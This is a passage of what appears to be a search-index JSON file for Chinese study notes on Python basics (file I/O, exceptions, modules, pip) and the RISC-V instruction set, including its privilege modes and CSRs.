obj.__getitem__(...) a in obj \u8c03\u7528 obj.__contains__(a) bool(obj) \u8c03\u7528 obj.__bool__() \u51fd\u6570\u7684\u8c03\u7528\u672c\u8d28\u4e0a\u662f\u8c03\u7528 func.__call__() a + b \u8c03\u7528 a.__add__(b) \u2026\u2026 \u4e00\u4e2a\u4f8b\u5b50\uff1a lst[a:b:c] \u5207\u7247\u64cd\u4f5c \u5176\u4e2d\u5207\u7247\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u662f\u4e00\u4e2a slice \u7c7b\u7684\u5b9e\u4f8b \u6240\u4ee5\u5b83\u7b49\u4ef7\u4e8e lst[slice(a, b, c)] \u800c\u901a\u8fc7 [] \u7684\u64cd\u4f5c\u53c8\u662f\u901a\u8fc7 __getitem__ \u9b54\u672f\u65b9\u6cd5\u5b9e\u73b0\u7684 \u6240\u4ee5\u5b83\u53c8\u7b49\u4ef7\u4e8e lst.__getitem__(slice(a, b, c)) __getitem__ \u65b9\u6cd5\u4e2d\u5904\u7406\u4e86 slice\uff0c\u8bfb\u53d6 abc \u7684\u503c\uff0c\u518d\u5904\u7406\u8fd4\u56de\u4e00\u4e2a\u65b0\u5217\u8868","title":"\u9b54\u672f\u65b9\u6cd5"},{"location":"cs/pl/python/basic/#_36","text":"","title":"\u6742\u9879\u5185\u5bb9"},{"location":"cs/pl/python/basic/#_37","text":"open \u51fd\u6570\uff0c\u4f20\u5165\u6587\u4ef6\u540d\u3001\u6253\u5f00\u6a21\u5f0f \u6253\u5f00\u6a21\u5f0f\uff08\u53ef\u4ee5\u53e0\u52a0\uff09\uff1ar \u8bfb\uff08\u9ed8\u8ba4\uff09\u3001w \u5199\u3001x \u521b\u5efa\u5e76\u5199\u3001a \u5199\u5728\u672b\u5c3e\u3001b \u5b57\u8282\u6a21\u5f0f\u3001t \u6587\u672c\u6a21\u5f0f\uff08\u9ed8\u8ba4\uff09 \u8bfb\u53d6 \u6587\u672c\u6a21\u5f0f\u5efa\u8bae\u52a0\u4e0a encoding\uff0c\u4e0d\u7136\u5bb9\u6613\u62a5\u9519 f.read() \u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff08\u5b57\u8282\u6a21\u5f0f\u5f97\u5230\u5b57\u8282\u5e8f\u5217\uff09 f.readline() \u8bfb\u53d6\u4e00\u884c f.readlines() \u8bfb\u53d6\u6240\u6709\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u5199\u5165 \u6587\u672c\u6a21\u5f0f\u540c\u6837\u5efa\u8bae\u52a0\u4e0a encoding f.write(...) \u76f4\u63a5\u5199\u5165 f.writelines(...) \u4f20\u5165\u5217\u8868\uff0c\u5143\u7d20\u95f4\u6362\u884c\u5199\u5165 \u901a\u8fc7\u8fd9\u79cd\u5f62\u5f0f\u64cd\u4f5c\u6587\u4ef6\u8bb0\u5f97\u7528\u5b8c\u540e\u8981 f.close() f = open ( \"filename\" , \"r\" , encoding = \"utf-8\" ) s = f . read () # a str ## line = f.readline() # a str ## lines = f.readlines() # a list ... f . close () f = open ( \"filename\" , \"w\" , encodeing = \"utf-8\" ) f . write ( \"...\" ) f . writelines ([ \"...\" , \"...\" ]) ... f . close ()","title":"\u6587\u4ef6\u64cd\u4f5c"},{"location":"cs/pl/python/basic/#with","text":"with ... as ...: \u5f00\u542f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668 \u5e38\u7528\u5728\u6587\u4ef6 open \u4e0a with \u5757\u5f00\u59cb\u81ea\u52a8\u6253\u5f00 with \u5757\u7ed3\u675f\u81ea\u52a8\u7ed3\u675f with \u5757\u7ed3\u675f\u540e\u53d8\u91cf\u4ecd\u4f1a\u7559\u5b58 with open ( \"file\" , \"r\" , encoding = \"utf-8\" ) as f : s = f . read () ... print ( f . closed ) # True","title":"with \u5757"},{"location":"cs/pl/python/basic/#_38","text":"\u4ea7\u751f\u9519\u8bef -> \u629b\u51fa\u5f02\u5e38 -> \u7a0b\u5e8f\u7ed3\u675f raise \u5173\u952e\u5b57\u629b\u51fa\u5f02\u5e38 try-except \u5757\u6355\u83b7\u5f02\u5e38 \u53ef\u4ee5\u6709\u591a\u4e2a except\u3001\u4e0d\u53ef\u4ee5\u6ca1\u6709 except \u540e\u63a5\u5f02\u5e38\u7c7b\uff08\u6ca1\u6709\u5219\u6355\u83b7\u6240\u6709\uff09 as \u5b57\u53e5\u5b58\u4e0b\u5f02\u5e38 finally \u8bed\u53e5 \u4e0d\u7ba1\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u8fd0\u884c raise ... raise RuntimeError ( \"...\" ) try : input ( \">>> \" ) except KeyboardInterrupt : print ( \"Good bye\" ) try : print ( 1 / 0 ) except ZeroDivisionError as e : print ( \"can't devide by zero\" ) raise e finally : print ( \"finished\" )","title":"\u5f02\u5e38\u4e0e\u5904\u7406"},{"location":"cs/pl/python/basic/#if-else","text":"else \u5757\u4e0d\u4ec5\u4ec5\u8ddf\u7740 if \u624d\u80fd\u4f7f\u7528 for-else for \u5faa\u73af\u7ed3\u675f\u624d\u4f1a\u8fd0\u884c for \u5faa\u73af\u88ab break \u4e86\u4e0d\u4f1a\u8fd0\u884c while-else condition \u4e0d\u6210\u7acb\u9000\u51fa\u624d\u4f1a\u8fd0\u884c \u5faa\u73af\u88ab break \u7ec8\u6b62\u4e86\u4e0d\u4f1a\u8fd0\u884c try-else try \u5757\u4e2d\u6ca1\u6709\u5f02\u5e38\u51fa\u73b0\u624d\u4f1a\u8fd0\u884c else \u5757\u4e2d\u5f02\u5e38\u4e0d\u4f1a\u88ab\u524d\u9762\u7684 except \u6355\u83b7 \u7a0b\u5e8f\u6d41\u8df3\u5230\u5757\u5916\u4e86\u4e0d\u4f1a\u8fd0\u884c\uff08return \u7b49\uff09 for value in lst : ... else : ... while condition : ... else : ... try : ... except ... : ... else : ...","title":"if \u5916\u7684 else \u8bed\u53e5"},{"location":"cs/pl/python/basic/#_39","text":"\u6a21\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684 .py \u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\u5939 \u6587\u4ef6\u5939\u76f8\u5f53\u4e8e\u5bfc\u5165\u5176\u4e0b __init__.py \u6587\u4ef6 \u6a21\u5757\u4e2d\u6b63\u5e38\u7f16\u5199\u51fd\u6570\u3001\u7c7b\u3001\u8bed\u53e5 \u901a\u8fc7 import \u8bed\u53e5\u5bfc\u5165\u6a21\u5757 import code import code as cd from code import ... from code import * \u5bfc\u5165\u65f6\u76f8\u5f53\u4e8e\u8fd0\u884c\u4e86\u4e00\u904d\u5bfc\u5165\u7684\u4ee3\u7801 ## code.py print ( \"hello\" ) def f (): print ( \"call func in code.py\" ) ... import code # hello code . f () import code as cd # hello cd . f () from code import f # hello f () from code import * # hello f ()","title":"\u6a21\u5757\u4e0e\u5bfc\u5165"},{"location":"cs/pl/python/basic/#main","text":"\u9632\u6b62\u5bfc\u5165\u65f6\u8fd0\u884c\u4ee3\u7801 \u53ea\u5141\u8bb8\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u65f6\u8fd0\u884c \u901a\u8fc7\u5224\u65ad __name__ \u5982\u679c\u662f\u76f4\u63a5\u8fd0\u884c\uff0c\u5219\u5176\u7b49\u4e8e\u5b57\u7b26\u4e32 __main__ \u5982\u679c\u662f\u88ab\u5bfc\u5165\u7684\uff0c\u5219\u5176\u7b49\u4e8e\u6a21\u5757\u540d ## code.py ... if __name__ == \"__main__\" : print ( \"hello\" ) else : print ( __name__ ) import code # code $ python code.py # hello","title":"\u201dmain \u51fd\u6570\u201c"},{"location":"cs/pl/python/basic/#_40","text":"python \u81ea\u5e26\u4e86\u5f88\u591a\u5b9e\u7528\u7684\u6a21\u5757\uff08\u6807\u51c6\u5e93\uff09 os\u3001sys\uff1a\u7cfb\u7edf\u64cd\u4f5c math\uff1a\u6570\u5b66\u8fd0\u7b97 re\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f datetime\uff1a\u65e5\u671f\u4e0e\u65f6\u95f4 subprocess\uff1a\u5b50\u8fdb\u7a0b\u7ba1\u7406 argparse\uff1a\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790 logging\uff1a\u65e5\u5fd7\u8bb0\u5f55 hashlib\uff1a\u54c8\u5e0c\u8ba1\u7b97 random\uff1a\u968f\u673a\u6570 csv\u3001json\uff1a\u6570\u636e\u683c\u5f0f\u89e3\u6790 collections\uff1a\u66f4\u591a\u7c7b\u578b ... \u770b\u6587\u6863\uff1a docs.python.org/zh-cn/3/library","title":"\u5185\u90e8\u6a21\u5757"},{"location":"cs/pl/python/basic/#_41","text":"pypi.org \u4e0a\u6709\u6781\u591a\u522b\u4eba\u5199\u597d\u4e86\u53ef\u4ee5\u7528\u7684\u6a21\u5757 numpy \u77e9\u9635\u7b49\u79d1\u5b66\u8ba1\u7b97\u3001scipy \u79d1\u5b66\u8ba1\u7b97\u3001matplotlib \u4f5c\u56fe\u2026\u2026 \u4f7f\u7528 pip \u5b89\u88c5\uff08pip / python -m pip\uff09 pip install pkg_name pip install pkg_name=... \u6307\u5b9a\u7248\u672c pip install -r requirements.txt \u5b89\u88c5 txt \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5305 pip install ... -i https://pypi.tuna.tsinghua.edu.cn/simple \u6362\u6e90 pip list\u3001pip show \u547d\u4ee4\u67e5\u770b\u5b89\u88c5\u7684\u6240\u6709\u5305/\u67d0\u4e2a\u5305\u7684\u4fe1\u606f pip uninstall pkg_name \u5378\u8f7d\u5305 pip \u5b89\u88c5\u672c\u5730\u6a21\u5757 \u76ee\u5f55\u4e0b\u9700\u8981\u5305\u542b setup.py / pyproject.toml pip install . \u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u590d\u5236\u5230 site-packages \u4e2d\uff09 pip install -e . \u53ef\u4fee\u6539\u5f62\u5f0f\u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u5728\u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4ee3\u7801\uff09","title":"\u5916\u90e8\u6a21\u5757\u5b89\u88c5"},{"location":"cs/pl/python/basic/#_42","text":"\u6a21\u5757\u5f00\u5934\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 \u7c7b\u3001\u51fd\u6570\u5b9a\u4e49\u4e0b\u9762\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 help(...) \u7684\u65f6\u5019\u53ef\u4ee5\u663e\u793a obj.__doc__ \u8868\u793a\u8fd9\u4e32\u5b57\u7b26\u4e32 \u7f16\u8f91\u5668\u7528\u6765\u63d0\u793a \u4e00\u4e9b\u6587\u6863\u751f\u6210\u5de5\u5177\uff08sphinx \u7b49\uff09\u4ece\u4e2d\u83b7\u53d6\u6587\u6863 \"\"\" docstring for module \"\"\" def func ( ... ): \"\"\"docstring for function\"\"\" ... class A (): \"\"\"docstring for class\"\"\" def __init__ ( self , ... ): \"\"\"docstring for method\"\"\" ...","title":"\u6587\u6863\u5b57\u7b26\u4e32"},{"location":"cs/pl/python/basic/#_43","text":"PEP\uff1aPython Enhancement Proposals\uff1a peps.python.org PEP 8 \u89c4\u8303\uff0c\u7ed9\u51fa\u4e86\u63a8\u8350\u4f7f\u7528\u7684 python \u4ee3\u7801\u98ce\u683c\u89c4\u8303 peps.python.org/pep-0008 pep8.org \u66f4\u7ec6\u81f4\u7684\u4ee3\u7801\u98ce\u683c black github.com/psf/black flake8 flake8.pycqa.org ...","title":"\u4ee3\u7801\u89c4\u8303"},{"location":"cs/pl/python/basic/#_44","text":"\u57fa\u7840 \u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300b ISBN 978-7-115-54608-1 Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial \u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1 \u8fdb\u9636 \u300a\u6d41\u7545\u7684 Python\u300b ISBN 978-7-115-45415-7 Python \u5b98\u65b9\u6587\u6863 docs.python.org/3 \u5b66\u4e00\u4e9b\u5b9e\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u770b\u6587\u6863 PEP peps.python.org \uff08\u6ce8\u610f\u5206\u6e05\u6709\u6ca1\u6709\u5b9e\u65bd\uff09 GitHub \u627e\u9879\u76ee\u8bfb","title":"\u66f4\u591a\uff1f"},{"location":"cs/pl/python/numpy/","text":"NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93 \u00b6 Abstract numpy \u7684\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6574\u7406\u81ea\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy TODO _(:\u0437\u300d\u2220)_","title":"NumPy"},{"location":"cs/pl/python/numpy/#numpy","text":"Abstract numpy \u7684\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6574\u7406\u81ea\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy TODO _(:\u0437\u300d\u2220)_","title":"NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93"},{"location":"cs/pl/python/pil/","text":"","title":"PIL"},{"location":"cs/pl/riscv/","text":"RISC-V ISA \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u4e0a\u5b66\u5230\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 RISC-V\uff0c\u5b98\u7f51 https://riscv.org/ \u5b50\u9875\u9762 RISC-V \u975e\u7279\u6743\u7ea7 ISA RISC-V \u7279\u6743\u7ea7 ISA \u57fa\u7840\u77e5\u8bc6 \u00b6 RISC-V \u662f\u4e00\u4e2a ISA \u6807\u51c6 RISC-V \u662f\u5b8c\u5168\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u4efb\u4f55\u4eba\u4f7f\u7528 \u7b80\u5355\u3001\u53ef\u6269\u5c55 \u5206\u4e3a\u7528\u6237\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08User-level ISA spec\uff09\u548c\u7279\u6743\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08Privilege ISA spec\uff09\u7b49 \u547d\u540d\u4e3a RV + \u6570\u636e\u5bbd\u5ea6 + \u6269\u5c55 \u6307\u4ee4\u96c6 \u00b6 \u57fa\u7840\u6307\u4ee4\u96c6\uff1aRV32I\u3001RV64I\uff0832/64 \u4f4d\u5e26\u6709\u6574\u578b\u64cd\u4f5c\u7684\u6307\u4ee4\u96c6\uff09\u3001RV32E\uff08\u53ea\u6709 16 \u4e2a\u5bc4\u5b58\u5668\u7684 32 \u4f4d\u6574\u578b\u6307\u4ee4\u96c6\uff09 I\uff1a\u5e26\u6709 ALU \u8fd0\u7b97\u3001\u5206\u652f\u8df3\u8f6c\u3001\u88c5\u8f7d\u5b58\u50a8 \u6269\u5c55\uff1a M\uff1a\u589e\u52a0\u6574\u578b\u4e58\u6cd5\u3001\u9664\u6cd5 A\uff1a\u539f\u5b50\u6307\u4ee4 F\uff1a\u589e\u52a0\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570 D\uff1a\u589e\u52a0\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 Q\uff1a\u589e\u52a0 128 \u4f4d\u56db\u7cbe\u5ea6\u6d6e\u70b9\u6570 Zicsr\uff1a\u589e\u52a0 CSR\uff08\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff09 Zifencei\uff1a\u589e\u52a0 FENCE.I \u6307\u4ee4 ... G\uff1a= IMAFDZicsr_Zifencei \u6269\u5c55\u4e86\u7684\u6307\u4ee4\u96c6\u5219\u547d\u540d\u4e3a RV32IM\u3001RV32IMA\u3001RV32G \u7b49\u7b49 \u7f16\u8bd1\u8fd0\u884c \u00b6 \u7f16\u8bd1 \u00b6 \u7f16\u8bd1\u4f7f\u7528 riscv-collab/riscv-gnu-toolchain \u9700\u8981\u624b\u52a8\u514b\u9686\u6e90\u7801\uff08\u6781\u5927\uff09\uff0c\u518d\u7f16\u8bd1\uff0c\u65f6\u95f4\u5f88\u957f \u7f16\u8bd1\u65f6\u6ce8\u610f prefix \u548c\u9009\u62e9\u6307\u4ee4\u96c6 --with-arch make linux \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-linux-gnu- xxx \uff0c\u4f7f\u7528 glibc \u6807\u51c6\u5e93\uff0c\u652f\u6301\u52a8\u6001\u94fe\u63a5 make \u6216 make newlib \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-elf- xxx \uff0c\u4f7f\u7528 riscv-newlib\uff0c\u53ea\u80fd\u9759\u6001\u94fe\u63a5 \u7f16\u8bd1 c \u4ee3\u7801\u4f7f\u7528 riscv xx -unknown- xxx -gcc \u5c31\u53ef\u4ee5\u4e86\uff0c\u6ce8\u610f\u6307\u5b9a -march \u548c -mabi\uff0c\u6bd4\u5982\u52a0\u4e0a -march=rv32i -mabi=ilp32 \u540e\u7f16\u8bd1\u51fa\u6765\u7684\u5c31\u662f\u4f7f\u7528 RV32I \u6307\u4ee4\u96c6\u7684\u673a\u5668\u7801 Ubuntu 20.04+ \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 apt \u5b89\u88c5\uff1a $ sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch \u8fd0\u884c \u00b6 \u56e0\u4e3a RISC-V \u662f\u53e6\u4e00\u79cd\u67b6\u6784\uff0c\u4e0d\u80fd\u5728 x86 \u673a\u5668\u4e0a\u76f4\u63a5\u8fd0\u884c\uff0c\u6240\u4ee5\u8981\u4f7f\u7528 qemu \u6765\u8fd0\u884c\u3002qemu \u76f4\u63a5\u4e0b\u8f7d\u5c31\u53ef\u4ee5\uff0c\u4e00\u822c\u90fd\u4f1a\u81ea\u5e26 RISC-V \u7684\u6a21\u62df\u5668\uff0c\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u7f16\u8bd1\u51fa RISC-V","title":"RISC-V ISA"},{"location":"cs/pl/riscv/#risc-v-isa","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u4e0a\u5b66\u5230\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 RISC-V\uff0c\u5b98\u7f51 https://riscv.org/ \u5b50\u9875\u9762 RISC-V \u975e\u7279\u6743\u7ea7 ISA RISC-V \u7279\u6743\u7ea7 ISA","title":"RISC-V ISA"},{"location":"cs/pl/riscv/#_1","text":"RISC-V \u662f\u4e00\u4e2a ISA \u6807\u51c6 RISC-V \u662f\u5b8c\u5168\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u4efb\u4f55\u4eba\u4f7f\u7528 \u7b80\u5355\u3001\u53ef\u6269\u5c55 \u5206\u4e3a\u7528\u6237\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08User-level ISA spec\uff09\u548c\u7279\u6743\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08Privilege ISA spec\uff09\u7b49 \u547d\u540d\u4e3a RV + \u6570\u636e\u5bbd\u5ea6 + \u6269\u5c55","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"cs/pl/riscv/#_2","text":"\u57fa\u7840\u6307\u4ee4\u96c6\uff1aRV32I\u3001RV64I\uff0832/64 \u4f4d\u5e26\u6709\u6574\u578b\u64cd\u4f5c\u7684\u6307\u4ee4\u96c6\uff09\u3001RV32E\uff08\u53ea\u6709 16 \u4e2a\u5bc4\u5b58\u5668\u7684 32 \u4f4d\u6574\u578b\u6307\u4ee4\u96c6\uff09 I\uff1a\u5e26\u6709 ALU \u8fd0\u7b97\u3001\u5206\u652f\u8df3\u8f6c\u3001\u88c5\u8f7d\u5b58\u50a8 \u6269\u5c55\uff1a M\uff1a\u589e\u52a0\u6574\u578b\u4e58\u6cd5\u3001\u9664\u6cd5 A\uff1a\u539f\u5b50\u6307\u4ee4 F\uff1a\u589e\u52a0\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570 D\uff1a\u589e\u52a0\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 Q\uff1a\u589e\u52a0 128 \u4f4d\u56db\u7cbe\u5ea6\u6d6e\u70b9\u6570 Zicsr\uff1a\u589e\u52a0 CSR\uff08\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff09 Zifencei\uff1a\u589e\u52a0 FENCE.I \u6307\u4ee4 ... G\uff1a= IMAFDZicsr_Zifencei \u6269\u5c55\u4e86\u7684\u6307\u4ee4\u96c6\u5219\u547d\u540d\u4e3a RV32IM\u3001RV32IMA\u3001RV32G \u7b49\u7b49","title":"\u6307\u4ee4\u96c6"},{"location":"cs/pl/riscv/#_3","text":"","title":"\u7f16\u8bd1\u8fd0\u884c"},{"location":"cs/pl/riscv/#_4","text":"\u7f16\u8bd1\u4f7f\u7528 riscv-collab/riscv-gnu-toolchain \u9700\u8981\u624b\u52a8\u514b\u9686\u6e90\u7801\uff08\u6781\u5927\uff09\uff0c\u518d\u7f16\u8bd1\uff0c\u65f6\u95f4\u5f88\u957f \u7f16\u8bd1\u65f6\u6ce8\u610f prefix \u548c\u9009\u62e9\u6307\u4ee4\u96c6 --with-arch make linux \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-linux-gnu- xxx \uff0c\u4f7f\u7528 glibc \u6807\u51c6\u5e93\uff0c\u652f\u6301\u52a8\u6001\u94fe\u63a5 make \u6216 make newlib \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscv xx -unknown-elf- xxx \uff0c\u4f7f\u7528 riscv-newlib\uff0c\u53ea\u80fd\u9759\u6001\u94fe\u63a5 \u7f16\u8bd1 c \u4ee3\u7801\u4f7f\u7528 riscv xx -unknown- xxx -gcc \u5c31\u53ef\u4ee5\u4e86\uff0c\u6ce8\u610f\u6307\u5b9a -march \u548c -mabi\uff0c\u6bd4\u5982\u52a0\u4e0a -march=rv32i -mabi=ilp32 \u540e\u7f16\u8bd1\u51fa\u6765\u7684\u5c31\u662f\u4f7f\u7528 RV32I \u6307\u4ee4\u96c6\u7684\u673a\u5668\u7801 Ubuntu 20.04+ \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 apt \u5b89\u88c5\uff1a $ sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch","title":"\u7f16\u8bd1"},{"location":"cs/pl/riscv/#_5","text":"\u56e0\u4e3a RISC-V \u662f\u53e6\u4e00\u79cd\u67b6\u6784\uff0c\u4e0d\u80fd\u5728 x86 \u673a\u5668\u4e0a\u76f4\u63a5\u8fd0\u884c\uff0c\u6240\u4ee5\u8981\u4f7f\u7528 qemu \u6765\u8fd0\u884c\u3002qemu \u76f4\u63a5\u4e0b\u8f7d\u5c31\u53ef\u4ee5\uff0c\u4e00\u822c\u90fd\u4f1a\u81ea\u5e26 RISC-V \u7684\u6a21\u62df\u5668\uff0c\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u7f16\u8bd1\u51fa RISC-V","title":"\u8fd0\u884c"},{"location":"cs/pl/riscv/privileged/","text":"RISC-V \u7279\u6743\u7ea7 ISA \u00b6 Abstract RISC-V \u6307\u4ee4\u96c6\u7684\u7279\u6743\u7ea7\u90e8\u5206\u3002 \u53c2\u8003\uff1a The RISC-V Instruction Set Manual Volume II: Privileged Architecture v.20211203 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b \u7279\u6743\u6a21\u5f0f \u00b6 RISC-V \u6307\u4ee4\u96c6\u6709\u4e09\u79cd\u7279\u6743\u6a21\u5f0f\uff0c\u5206\u522b\u662f Machine\uff08M\uff09\u3001Supervisor\uff08S\uff09\u548c User\uff08U\uff09\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 Hypervisor\uff08H\uff09\u6a21\u5f0f\uff0c\u4e0d\u8fc7\u8c8c\u4f3c\u4e0d\u5e38\u7528\u3002 \u7b49\u7ea7 \u7f16\u7801 \u540d\u79f0 \u7f29\u5199 0 00 User/Application U 1 01 Supervisor S 2 10 Hypervisor H 3 11 Machine M M \u6a21\u5f0f\u662f\u5bf9\u786c\u4ef6\u64cd\u4f5c\u7684\u62bd\u8c61\uff0c\u6709\u6700\u9ad8\u7ea7\u522b\u7684\u6743\u9650\u3002 S \u6a21\u5f0f\u4ecb\u4e8eM\u6a21\u5f0f\u548cU\u6a21\u5f0f\u4e4b\u95f4\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u5185\u6838\u6001\uff08Kernel\uff09\u3002\u5f53\u7528\u6237\u9700\u8981\u5185\u6838\u8d44\u6e90\u65f6\uff0c\u5411\u5185\u6838\u7533\u8bf7\uff0c\u5e76\u5207\u6362\u5230\u5185\u6838\u6001\u8fdb\u884c\u5904\u7406\u3002 U \u6a21\u5f0f\u7528\u4e8e\u6267\u884c\u7528\u6237\u7a0b\u5e8f\uff0c\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5bf9\u5e94\u4e8e\u7528\u6237\u6001\uff0c\u6709\u6700\u4f4e\u7ea7\u522b\u7684\u6743\u9650\u3002 \u7b80\u5355\u5d4c\u5165\u5f0f\u7cfb\u7edf\u5e94\u8be5\u81f3\u5c11\u6709 M \u6a21\u5f0f\uff0c\u5b89\u5168\u7684\u5d4c\u5165\u5f0f\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001U \u4e24\u4e2a\u6a21\u5f0f\uff0cUnix-like \u64cd\u4f5c\u7cfb\u7edf\u81f3\u5c11\u8981\u6709 M\u3001S\u3001U \u4e09\u4e2a\u6a21\u5f0f\u3002 \u7279\u6743\u6a21\u5f0f\u7528\u6765\u5206\u79bb\u3001\u4fdd\u62a4\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u3002\u8bd5\u56fe\u5728\u4f4e\u7279\u6743\u6a21\u5f0f\u4e0b\u6267\u884c\u9ad8\u7279\u6743\u6a21\u5f0f\u7684\u6307\u4ee4\u4f1a\u5bfc\u81f4\u5f02\u5e38\u3002 \u4e00\u4e2a hart\uff08RISC-V hardware thread\uff0c\u6307 RISC-V \u5904\u7406\u5668\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff09\u4e00\u822c\u5728 U \u6a21\u5f0f\u4e0b\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff0c\u76f4\u5230\u9047\u5230 trap\uff08\u6bd4\u5982\u7cfb\u7edf\u8c03\u7528\u3001\u65f6\u95f4\u4e2d\u65ad\u7b49\uff09\uff0c\u8fd9\u65f6 hart \u4f1a\u5207\u6362\u5230\u66f4\u9ad8\u7279\u6743\u7ea7\u7684 trap handler\uff0c\u6267\u884c\u5b8c\u540e\u518d\u5207\u6362\u56de\u4f4e\u6743\u9650\u6a21\u5f0f\u7ee7\u7eed\u6267\u884c\u3002 \u9664\u6b64\u4e4b\u5916\uff0cRISC-V \u8fd8\u89c4\u5b9a\u4e86 Debug mode\uff08D-mode\uff09\uff0c\u7528\u4e8e\u8c03\u8bd5\uff0c\u5b83\u6bd4 M \u6a21\u5f0f\u6709\u66f4\u9ad8\u7684\u6743\u9650\uff0c\u6709\u4e00\u4e9b\u53ea\u6709 D \u6a21\u5f0f\u624d\u53ef\u4ee5\u8bbf\u95ee\u7684 CSR \u5bc4\u5b58\u5668\uff0c\u4e5f\u4f1a\u4fdd\u7559\u4e00\u4e9b\u7269\u7406\u5730\u5740\u7a7a\u95f4\u3002 \u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09 \u00b6 CSR \u662f RISC-V CPU \u4e2d\u7684\u4e00\u7cfb\u5217\u7279\u6b8a\u5bc4\u5b58\u5668\uff0c\u80fd\u591f\u53cd\u6620\u548c\u63a7\u5236 CPU \u5f53\u524d\u7684\u72b6\u6001\u548c\u6267\u884c\u673a\u5236\u3002 RISC-V \u7ed9 CSR \u5206\u914d\u4e86 12 \u4f4d\u7684\u5730\u5740\u7a7a\u95f4\uff08csr[11:0])\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u6700\u591a 4096 \u4e2a CSR\uff0c\u5176\u4e2d csr[11:10] \u8868\u793a\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u6743\u9650\uff0800/01/10 \u5747\u8868\u793a\u53ef\u8bfb\u53ef\u5199\uff0c11 \u8868\u793a\u53ea\u8bfb\uff09\uff0ccsr[9:8] 